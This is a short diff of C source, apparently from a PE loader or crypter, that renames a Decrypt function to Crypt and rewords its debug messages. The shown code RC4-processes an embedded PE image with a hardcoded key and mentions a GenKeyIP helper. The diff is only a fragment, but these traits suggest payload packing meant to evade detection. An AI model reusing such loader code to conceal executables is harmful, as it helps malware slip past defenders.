@@ -71,7 +71,7 @@ char* GenKeyIP(char ips[][15], size_t count) {
 ------------------------------------*/
 BOOL rc4enc(PBYTE pKey, PBYTE pData, DWORD dwKey, DWORD sData) {
 
-	DEBUG_PRINT("[*] Decrypting the PE with size: %d.\n", sData);
+	DEBUG_PRINT("[*] Crypt processing PE with size: %d.\n", sData);
 	NTSTATUS status = NULL;
 	USTRING Key = {
 		.Length = dwKey,
@@ -95,7 +95,7 @@ BOOL rc4enc(PBYTE pKey, PBYTE pData, DWORD dwKey, DWORD sData) {
 		DEBUG_PRINT("[!] Operation failed with status: %d\n", status);
 		return FALSE;
 	};
-	DEBUG_PRINT("[*] Decrypted!\n");
+	//DEBUG_PRINT("[*] Crypt finished!\n");
 	return TRUE;
 }
 
@@ -104,7 +104,7 @@ BOOL rc4enc(PBYTE pKey, PBYTE pData, DWORD dwKey, DWORD sData) {
 /*-------------------------------------------
  PE decryption function
 -------------------------------------------*/
-BOOL Decrypt(PCONTENT cnt) {
+BOOL Crypt(PCONTENT cnt) {
 	//Encryption key
 	char ekey[] = { 0x4e,0x62,0x51,0x25,0x3a,0x53,0x4a,0x3b,0x5d,0x7b,0x6b,0x21,0x57,0x75,0x4b,0x72,0x3a,0x68,0x21,0x38,0x4a,0x25,0x34,0x40,0x46,0x58,0x61,0x79,0x4d,0x71,0x57,0x21,0x7d,0x62,0x56,0x5d,0x48,0x23,0x5d,0x4e,0x61,0x5d,0x32,0x71,0x45,0x69,0x5b,0x52,0x7d,0x61,0x4a,0x34,0x2f,0x2a,0x3a,0x45,0x35,0x32,0x25,0x2b,0x2c,0x69,0x54,0x00 };
 
@@ -122,7 +122,7 @@ BOOL Decrypt(PCONTENT cnt) {
 	DWORD scSize = cnt->size;
 
 	if (!rc4enc(&ekey, cnt->data, sizeof(ekey), scSize)) {
-		DEBUG_PRINT("[!] Decryption failed.\n");
+		DEBUG_PRINT("[!] Crypt operation failed.\n");
 		return FALSE;
 	}
 	return TRUE;
